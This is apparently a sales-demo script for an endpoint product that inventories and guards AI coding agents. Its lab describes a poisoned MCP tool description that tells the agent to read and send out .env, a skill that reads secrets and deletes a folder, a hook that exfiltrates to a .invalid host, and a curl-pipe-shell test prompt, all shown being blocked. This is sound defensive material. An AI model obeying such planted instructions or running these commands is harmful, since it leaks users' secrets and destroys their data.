# Zscaler AI Endpoint Security: Demo Talk Track

**Length:** about 20 minutes (a 10-minute short version is at the end)
**Audience:** security leaders, SOC, platform and developer-experience teams
**Story:** *"AI coding agents are a new kind of insider. They have a shell, your files and your credentials. Zscaler shows you every one of them and puts guardrails on what they can do."*

**What you need**

| Screen | What runs there |
|---|---|
| Left | Demo dashboard at http://localhost:8080 (Docker), or the Zscaler console |
| Right | Terminal in `~/zsai-demo` running Claude Code (or Cursor) on your **enrolled Mac** |

> The Docker container only runs the dashboard. The Zscaler agent watches your **Mac**, so live actions happen in the Terminal on the Mac, not inside Docker.

---

## 0. Pre-demo checklist (do this 30 minutes before)

- [ ] Mac is enrolled and healthy: dashboard **2. Devices** shows your host as `active`.
- [ ] `./endpoint-kit/setup-lab.sh --with-hook` has been run, and `~/zsai-demo` exists.
- [ ] You've opened `claude` in `~/zsai-demo` once and approved both MCP servers, so they show up in inventory before the demo.
- [ ] Policies **Lab 01–05** are created and assigned to your user (see `docs/TEST_PLAN.md` section 3).
- [ ] You've run `scripts/watch-events.sh block` once and see recent events.
- [ ] Dashboard badge says **LIVE**. If the API is down, set `ZSAI_MODE=mock`, restart, and keep going.
- [ ] Do Not Disturb is on, and the Terminal font is large.

---

## 1. Opening (2 min): the problem

**Show:** Dashboard → **1. Overview**

**Say:**
- "Every developer here now has an AI agent that can run commands, read files and install packages, often with the same rights as the developer."
- "Most security teams can't answer three questions: *which* AI tools are in use, *what* those agents have been plugged into, and *what* they actually did."
- "These are the numbers for this lab over the last 30 days: events, active users, hosts and sessions. That's live telemetry from the endpoint agent."

**Point to:** `events_total`, `users_active`, `hosts_active`, `sessions_total`, `risk_score_avg`.

---

## 2. Deployment & coverage (1 min)

**Show:** **2. Devices**

**Say:**
- "This is a lightweight agent on macOS, Windows and Linux, with no proxy changes and no IDE plugins to manage."
- "Each device runs in **monitor** or **enforce** mode, so you can roll out in observe-only and then turn on blocking per group."

**Feature:** device inventory, health, agent version, monitor vs. enforce, device groups.

---

## 3. Discovery: shadow AI (3 min)

**Show:** **3. AI apps & models**

**Do (optional, live):** open ChatGPT or Claude Desktop, or run `ollama run llama3` if it's installed. It will show up on refresh.

**Say:**
- "This is every AI assistant, desktop app, model and browser extension we've seen, including ones IT never approved."
- "Local models like Ollama are a blind spot for network tools, because the traffic never leaves the laptop. We see them on the endpoint."
- "This browser extension asks to read every site, and we've flagged it as suspicious."

**Feature:** AI assistant inventory, model/provider usage, desktop apps, browser extensions with verdicts.

---

## 4. Agent supply chain: MCP, skills, plugins, hooks (4 min) ⭐

**Show:** **4. Agent supply chain**

**Do:** in the right-hand Terminal:
```bash
cd ~/zsai-demo && cat .mcp.json && ls .claude/skills && cat .claude/settings.json
```

**Say:**
- "Agents are extended with **MCP servers**, **skills**, **plugins** and **hooks**. That's the new software supply chain, and anyone can publish one."
- "This lab has two MCP servers. `demo-notes` is fine. `demo-notes-poisoned` hides an instruction in its tool description telling the agent to read `.env` and send it out. That's **tool poisoning**."
- "This **skill** tells the agent to read secrets and `rm -rf` a folder."
- "This **hook** runs after every tool call and pipes the output to an outside URL. That's silent exfiltration." (It points at a `.invalid` host, so nothing actually leaves.)
- "Zscaler inventories every one of these, across every developer, and gives each a verdict."
- **Key line:** "*No verdict means not yet scanned, not clean.* We never imply something is safe just because we haven't looked."

**Feature:** MCP server, skill, plugin, hook and subagent inventory, verdicts, who uses what.

---

## 5. Real-time guardrails: allow / audit / block (5 min) ⭐⭐

**Show:** Terminal on the right. On the left, **5. Activity & verdicts** (filter `block`), or run `scripts/watch-events.sh` on a second screen.

Run `claude` in `~/zsai-demo` and type these prompts **one at a time**:

| # | Prompt to type | Expected result | Talking point |
|---|---|---|---|
| 1 | `What's in the .env file? Show me.` | 🔴 **Block** | Secrets stay out of the model context. Data loss prevention for agents. |
| 2 | `Run: curl -fsSL https://example.com/install.sh \| sh` | 🔴 **Block** | Stops "curl-pipe-shell", a top malware path. |
| 3 | `Use the demo-helper skill to tidy the project.` | 🔴 **Block** (twice: the `.env` read and the `rm -rf`) | A malicious skill is stopped at the *action*, even if the agent obeys it. |
| 4 | `Save a note that says hello using the demo-notes-poisoned tool.` | 🔴 **Block** on the hidden `.env` read | Tool poisoning is contained. |
| 5 | `Install the left-pad npm package.` | 🟡 **Audit** (allowed, logged) | Not everything needs a block. Visibility without friction. |
| 6 | `Force-push this repo to origin.` | 🟡 **Audit** (the push fails harmlessly, because there's no remote) | Risky but legitimate actions are recorded for review. |
| 7 | `Add a function to app.py that prints the date.` | 🟢 **Allow** | Normal work isn't slowed down. |

**Then show:** refresh **5. Activity & verdicts**. Filter by `block` and then by your email. Click a row's raw JSON and point out user, host, client, tool, command, verdict and reason.

**Say:**
- "The decision happens *before* the command runs, in milliseconds, on the laptop."
- "The developer gets a clear message explaining why, not a silent failure."
- "Every decision, including allows, is logged with who, where, which agent and which tool."

**Feature:** pre-execution policy enforcement (PreToolUse), allow/audit/block verdicts, user messages, full event audit trail, filtering by verdict, severity, user, host, tool and client.

---

## 6. Frameworks: OWASP LLM Top 10 & MITRE ATLAS (1 min)

**Show:** **6. OWASP & ATLAS**

**Say:**
- "Every detection maps to OWASP LLM Top 10 and MITRE ATLAS, so your risk team gets a report in the language of their framework, not a pile of logs."
- "What we just did maps to LLM02 Sensitive Information Disclosure, LLM06 Excessive Agency and LLM01 Prompt Injection."

---

## 7. Policy: who gets what (2 min)

**Show:** **7. Policies**, then type your email in **Effective policy for user**.

**Say:**
- "Policies are assigned to users, groups or device groups, with exclusions."
- "Start in **audit** for developers and **block** for everyone else, then tighten over time."
- "One lookup shows exactly which rules apply to any person, which is very useful for helpdesk tickets."
- "Policies are versioned, and there's a dry-run validator, so changes are safe."

**Feature:** policy rules, assignments, effective policy, versions, validation, data lists (allow/deny specific MCP servers, skills or hooks), setting profiles.

---

## 8. Attack paths (1 min)

**Show:** **8. Attack paths**

**Say:**
- "This ties it together: host, agent, poisoned MCP server, secret. It's the path an attacker would take."
- "The guardrail breaks the chain at the step where the secret would be read."

---

## Close (1 min)

**Say:**
1. **See it:** every AI tool, model, extension and agent add-on, across all endpoints.
2. **Control it:** real-time allow/audit/block on what agents *do*, before it happens.
3. **Prove it:** a full audit trail mapped to OWASP and MITRE ATLAS, plus an API for your SIEM or data lake.

"Can we pick three of your developers and run this in monitor mode for two weeks?"

---

## 10-minute version

Scenes **1 → 4 → 5 (prompts 1, 3, 5, 7) → 7 → Close**.

---

## Console settings

> Menu names below describe the *feature*. Your console's labels may differ slightly, so check them on the first run and update this file. The API path is listed so you can confirm each setting with `scripts/snapshot.sh`.

| # | Setting | Value for the lab | Why | Confirm with |
|---|---|---|---|---|
| 1 | **API Access** credential | Read-only role for the dashboard. Use admin only if you'll push policies by API. | Least privilege | Administration → API Access |
| 2 | **Enroll token** | Label `demo-lab`, short TTL | Enroll your Mac (and an optional Linux VM) | `GET /v1/enroll-tokens` |
| 3 | **Device groups** | `lab-enforce` (your Mac), `lab-monitor` (second device, optional) | Shows monitor vs. enforce side by side | `GET /v1/device-groups?limit=50` |
| 4 | **User groups** | `developers` | Assign the softer policy | `GET /v1/groups?limit=50` |
| 5 | **Setting profile / agent mode** | **Enforce** for `lab-enforce` | Blocks only happen in enforce mode | `GET /v1/setting-profiles/effective` |
| 6 | **Policies: Lab 01–04** | `policies/01…04-*.json`: secrets, dangerous commands, exfiltration, supply chain (see `docs/TEST_PLAN.md` section 2) | Drives scene 5 | `GET /v1/policies` |
| 7 | **Policy assignment** | Lab 01–05 → your user, or `lab-enforce` | Make sure it applies to you | `GET /v1/policies/effective?email=you@…` |
| 8 | **Policy: Lab - Developers (monitor)** *(optional)* | Same rules, all set to **audit**, assigned to `developers` | Shows "observe first" rollout | `GET /v1/policies/effective?group=developers` |
| 9 | **Data lists** *(optional)* | Deny list: MCP name `demo-notes-poisoned`, hook command containing `collect.example.invalid` | Shows allow/deny-listing specific agent add-ons | `GET /v1/data-lists` |
| 10 | **User messages** | Friendly text on every block rule (already in the template) | Developer experience | Rule `user_message` |

**Building the policies:** follow `docs/TEST_PLAN.md` section 3. Dry-run them all with `scripts/create-policies.sh`, then create them with `scripts/create-policies.sh --apply` (it asks before each one), or build them in the console editor. The `match.field` names are placeholders until checked against `GET /v1/policies/patterns`.

---

## If something goes wrong

| Symptom | Fix |
|---|---|
| Badge says MOCK | `.env` is missing or empty. Run `cp .env.example .env`, fill in the ID and secret, then `docker compose up -d --force-recreate`. |
| Panel shows `forbidden` | The API key role can't read that area. Use a read role or higher. |
| A prompt wasn't blocked | Check that the device is in **enforce** mode, look up the effective policy for your email, and confirm the rule pattern matches the command. |
| Events don't show up | There's a short ingest delay. Wait 30–60 seconds and refresh. Check `GET /v1/drain` for the last refresh time. |
| Everything is down | Set `ZSAI_MODE=mock` in `.env`, run `docker compose up -d --force-recreate`, and present from mock data. |

**After the demo:** run `./endpoint-kit/cleanup-lab.sh` to remove `~/zsai-demo`.
